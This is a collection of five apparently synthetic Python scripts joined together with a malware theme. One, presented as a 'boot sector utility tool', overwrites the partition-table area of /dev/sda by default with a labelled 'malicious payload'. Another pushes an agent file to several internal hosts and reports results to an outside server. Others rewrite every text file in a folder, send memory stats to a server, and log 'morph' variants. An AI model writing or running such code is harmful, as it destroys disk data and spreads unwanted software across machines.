import os
import sys
import subprocess
from datetime import datetime
import time
import argparse

def is_text_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            f.read(1024)
        return True
    except (UnicodeDecodeError, IOError):
        return False

def append_marker_to_files(directory, marker, log_file):
    for root, _, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            timestamp = datetime.now().isoformat()
            if is_text_file(filepath):
                try:
                    with open(filepath, 'a', encoding='utf-8') as f:
                        f.write(marker)
                    log_file.write(f"{timestamp} - SUCCESS: Modified '{filepath}'\n")
                except IOError as e:
                    log_file.write(f"{timestamp} - SKIPPED: Could not modify '{filepath}' (IOError: {e})\n")
            else:
                log_file.write(f"{timestamp} - SKIPPED: '{filepath}' is not a text file\n")

def start_service(log_file):
    try:
        subprocess.check_call(["echo", "Service started"])
        log_file.write(f"{datetime.now().isoformat()} - INFO: Service started successfully\n")
    except subprocess.CalledProcessError as e:
        log_file.write(f"{datetime.now().isoformat()} - ERROR: Failed to start service (Error: {e})\n")

def monitor_directory(target_dir, marker, interval, iterations):
    log_file_path = 'modification_log.txt'

    with open(log_file_path, 'w', encoding='utf-8') as log_file:
        start_service(log_file)

        for _ in range(iterations):
            append_marker_to_files(target_dir, marker, log_file)
            time.sleep(interval)

def main():
    parser = argparse.ArgumentParser(description="Monitor and modify text files in the './target' directory.")
    parser.add_argument('--marker', type=str, default='--MODIFIED--', help="Marker string to append (default: '--MODIFIED--').")
    parser.add_argument('--interval', type=int, default=1, help="Interval in seconds between monitoring cycles (default: 1).")
    parser.add_argument('--iterations', type=int, default=1, help="Number of monitoring cycles (default: 1).")
    args = parser.parse_args()

    target_dir = './target'
    if not os.path.exists(target_dir):
        print(f"Directory '{target_dir}' does not exist.", file=sys.stderr)
        sys.exit(1)

    monitor_directory(target_dir, args.marker, args.interval, args.iterations)
    print(f"Monitoring complete. Log written to 'modification_log.txt'")

if __name__ == "__main__":
    main()

import subprocess
import sys
import os
import argparse
import logging

BOOT_PAYLOAD = b"This is a malicious payload.\n"

def setup_logging(log_file):
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
    )

def read_boot_sector(device, verbose):
    try:
        if verbose:
            logging.info(f"Attempting to read boot sector from {device}.")
        result = subprocess.run(
            ["dd", f"if={device}", "bs=512", "count=1"],
            capture_output=True,
            text=False,
            check=True
        )
        if verbose:
            logging.info("Boot sector read successfully.")
        return result.stdout
    except FileNotFoundError:
        logging.error("Error: 'dd' command not found. Ensure it is installed and accessible.")
        if verbose:
            print("Error: 'dd' command not found. Ensure it is installed and accessible.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error: Failed to execute 'dd' command. Return code: {e.returncode}. Stderr: {e.stderr.strip()}")
        if verbose:
            print(f"Error: Failed to execute 'dd' command. Return code: {e.returncode}.")
    except PermissionError:
        logging.error("Error: Permission denied. Please run the script with appropriate privileges.")
        if verbose:
            print("Error: Permission denied. Please run the script with appropriate privileges.")
    except Exception as e:
        logging.error(f"Unexpected error occurred: {e}")
        if verbose:
            print(f"Unexpected error occurred: {e}")
    return None

def write_to_file(data, filename, verbose):
    try:
        with open(filename, "wb") as file:
            file.write(data)
        logging.info(f"Boot sector information written to '{filename}'.")
        if verbose:
            print(f"Boot sector information written to '{filename}'.")
    except PermissionError:
        logging.error(f"Error: Permission denied while writing to '{filename}'.")
        if verbose:
            print(f"Error: Permission denied while writing to '{filename}'.")
    except OSError as e:
        logging.error(f"Error: Failed to write to file '{filename}'. Reason: {e}")
        if verbose:
            print(f"Error: Failed to write to file '{filename}'. Reason: {e}")
    except Exception as e:
        logging.error(f"Unexpected error occurred while writing to file: {e}")
        if verbose:
            print(f"Unexpected error occurred while writing to file: {e}")

def infect_boot_sector(device, payload, verbose):
    try:
        if verbose:
            logging.info(f"Infecting boot sector of {device} with payload.")

        # Read the original boot sector
        original_boot_sector = read_boot_sector(device, verbose)
        if original_boot_sector is None:
            raise RuntimeError("Failed to read the original boot sector.")

        # Modify the boot sector to include the payload at the end
        modified_boot_sector = original_boot_sector[:446] + payload + b"\x00" * (512 - 446 - len(payload))

        # Write the modified boot sector back to the device
        subprocess.run(
            ["dd", f"of={device}", "bs=512", "count=1", "conv=notrunc"],
            input=modified_boot_sector,
            check=True
        )
        logging.info(f"Boot sector of {device} infected successfully.")
        if verbose:
            print(f"Boot sector of {device} infected successfully.")
    except FileNotFoundError:
        logging.error("Error: 'dd' command not found. Ensure it is installed and accessible.")
        if verbose:
            print("Error: 'dd' command not found. Ensure it is installed and accessible.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error: Failed to execute 'dd' command for infection. Return code: {e.returncode}. Stderr: {e.stderr.strip()}")
        if verbose:
            print(f"Error: Failed to execute 'dd' command for infection. Return code: {e.returncode}.")
    except PermissionError:
        logging.error("Error: Permission denied. Please run the script with appropriate privileges.")
        if verbose:
            print("Error: Permission denied. Please run the script with appropriate privileges.")
    except Exception as e:
        logging.error(f"Unexpected error occurred during infection: {e}")
        if verbose:
            print(f"Unexpected error occurred during infection: {e}")

def main():
    parser = argparse.ArgumentParser(description="Boot sector utility tool.")
    parser.add_argument(
        "-d", "--device", 
        default="/dev/sda", 
        help="The device to read the boot sector from (default: /dev/sda)."
    )
    parser.add_argument(
        "-o", "--output", 
        default="boot_report.txt", 
        help="The file to write the boot sector information to (default: boot_report.txt)."
    )
    parser.add_argument(
        "-l", "--log", 
        default="boot_tool.log", 
        help="The log file to write program logs to (default: boot_tool.log)."
    )
    parser.add_argument(
        "-v", "--verbose", 
        action="store_true", 
        help="Enable verbose logging and console output."
    )
    args = parser.parse_args()

    # Set up logging
    setup_logging(args.log)
    logging.info("Boot sector utility started.")

    try:
        # Step 1: Read the original boot sector
        boot_sector_data = read_boot_sector(args.device, args.verbose)
        if boot_sector_data:
            # Step 2: Save the boot sector to a file
            write_to_file(boot_sector_data, args.output, args.verbose)

            # Step 3: Infect the boot sector with a payload
            infect_boot_sector(args.device, BOOT_PAYLOAD, args.verbose)
    except KeyboardInterrupt:
        logging.warning("Operation cancelled by user.")
        if args.verbose:
            print("\nOperation cancelled by user.")
        sys.exit(1)
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        if args.verbose:
            print(f"An unexpected error occurred: {e}")
        sys.exit(1)

    logging.info("Boot sector utility completed successfully.")
    if args.verbose:
        print("Boot sector utility completed successfully.")

if __name__ == "__main__":
    main()

import os
import sys
import argparse
import http.client
import json
import traceback
import resource
import urllib.parse

def get_memory_info():
    try:
        usage = resource.getrusage(resource.RUSAGE_SELF)
        return {
            "max_rss_kb": usage.ru_maxrss,
            "shared_memory_kb": getattr(usage, "ru_ixrss", 0),
            "unshared_memory_kb": getattr(usage, "ru_idrss", 0),
            "stack_memory_kb": getattr(usage, "ru_isrss", 0),
        }
    except Exception as e:
        return {"error": f"Unable to access memory usage data: {e}"}

def write_memory_info_to_file(data, filename="memory_dump.txt"):
    try:
        with open(filename, "w", encoding="utf-8") as file:
            for key, value in data.items():
                file.write(f"{key}: {value}\n")
    except Exception as e:
        print(f"Error writing to file: {e}")
        traceback.print_exc()

def send_memory_info_to_server(data, server_url, retries, verbose):
    for attempt in range(retries):
        try:
            if verbose:
                print(f"Attempt {attempt + 1} to send data to server: {server_url}")

            parsed_url = urllib.parse.urlparse(server_url)
            host = parsed_url.netloc
            path = parsed_url.path or "/"

            connection = http.client.HTTPConnection(host)
            headers = {"Content-Type": "application/json"}
            connection.request("POST", path, body=json.dumps(data), headers=headers)
            response = connection.getresponse()

            if response.status == 200:
                if verbose:
                    print(f"Data successfully sent to {server_url}")
                break
            else:
                if verbose:
                    print(f"Server responded with status: {response.status} {response.reason}")
        except Exception as e:
            print(f"Error sending data to server: {e}")
            if verbose:
                traceback.print_exc()
        finally:
            connection.close()
    else:
        print(f"Failed to send data to server after {retries} retries")

def parse_arguments():
    parser = argparse.ArgumentParser(description="Memory Snapshot Tool")
    parser.add_argument("--server-url", type=str, default="http://localhost:8080/memory", help="URL of the server to send memory data to")
    parser.add_argument("--retries", type=int, default=3, help="Number of retries for sending data to server")
    parser.add_argument("--verbose", action="store_true", default=False, help="Enable verbose logging")
    return parser.parse_args()

def main():
    print("Memory Snapshot Tool initialized")
    args = parse_arguments()

    memory_info = get_memory_info()
    write_memory_info_to_file(memory_info)

    print("Memory usage information written to memory_dump.txt")
    send_memory_info_to_server(memory_info, args.server_url, args.retries, args.verbose)

    print("Memory Snapshot Tool completed")
    sys.exit(0)

if __name__ == "__main__":
    main()

import os
import shutil
import sys
import socket
import json
import argparse

LOG_FILE = "push_failures.log"

def parse_arguments():
    parser = argparse.ArgumentParser(description="Deployment Agent Utility")
    parser.add_argument("agent_path", help="Path to the deployment agent file")
    parser.add_argument("--hosts", nargs="+", default=["10.0.0.11", "10.0.0.12", "10.0.0.13"], help="List of target hosts")
    parser.add_argument("--port", type=int, default=8089, help="Port to push the deployment agent")
    parser.add_argument("--data_server", default="data.example.com:9000", help="Data collection server address")
    parser.add_argument("--register", action="store_true", help="Register the deployment service")
    return parser.parse_args()

def package_deployment_agent(agent_path):
    if not os.path.isfile(agent_path):
        print(f"Error: File '{agent_path}' does not exist or is not a valid file.")
        sys.exit(1)

    staging_dir = 'staging'
    try:
        os.makedirs(staging_dir, exist_ok=True)
        shutil.copy(agent_path, staging_dir)
        print(f"Deployment agent '{agent_path}' successfully copied to '{staging_dir}/'.")
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

def push_to_host(agent_path, host, port):
    try:
        with socket.create_connection((host, port), timeout=5) as conn:
            with open(agent_path, 'rb') as f:
                conn.sendall(f.read())
        print(f"Successfully pushed '{agent_path}' to {host}:{port}.")
        return True
    except Exception as e:
        log_failure(host, str(e))
        print(f"Failed to push to {host}:{port}. Error: {e}")
        return False

def log_failure(host, error_message):
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"Host: {host}, Error: {error_message}\n")

def report_results(successful, failed, data_server):
    server, port = data_server.split(":")
    payload = {
        "successful_deployments": successful,
        "failed_deployments": failed
    }
    try:
        with socket.create_connection((server, int(port)), timeout=5) as conn:
            conn.sendall(json.dumps(payload).encode('utf-8'))
        print(f"Deployment results successfully reported to {data_server}.")
    except Exception as e:
        print(f"Failed to report results to {data_server}. Error: {e}")

def register_deployment_service(staging_dir):
    try:
        confirmation_file = os.path.join(staging_dir, "deployment_registered.txt")
        with open(confirmation_file, "w") as f:
            f.write("Deployment service registered successfully.\n")
        print(f"Deployment service registration file created at '{confirmation_file}'.")
    except Exception as e:
        print(f"Failed to register deployment service. Error: {e}")

if __name__ == '__main__':
    args = parse_arguments()

    package_deployment_agent(args.agent_path)
    staged_agent_path = os.path.join('staging', os.path.basename(args.agent_path))

    successful = []
    failed = []

    for host in args.hosts:
        if push_to_host(staged_agent_path, host, args.port):
            successful.append(host)
        else:
            failed.append(host)

    report_results(successful, failed, args.data_server)

    if args.register:
        register_deployment_service('staging')

import sys
import uuid
import hashlib
from datetime import datetime

LOG_FILE = "morph_log.txt"

def generate_unique_id(variant):
    return hashlib.md5(variant.encode()).hexdigest()

def log_variant_event(variant, log_file):
    timestamp = datetime.utcnow().isoformat()
    unique_id = generate_unique_id(variant)
    with open(log_file, "a") as f:
        f.write(f"variant: {variant}, copy: {timestamp}, morph: {unique_id}\n")

def process_variants(variants, log_file):
    for variant in variants:
        print(f"Processing variant: {variant}")
        log_variant_event(variant, log_file)

def main():
    if len(sys.argv) > 1:
        variants = sys.argv[1:]
        process_variants(variants, LOG_FILE)
        print(f"{len(variants)} variants processed. Log file: {LOG_FILE}")
    else:
        print("No variants provided.")

if __name__ == "__main__":
    main()
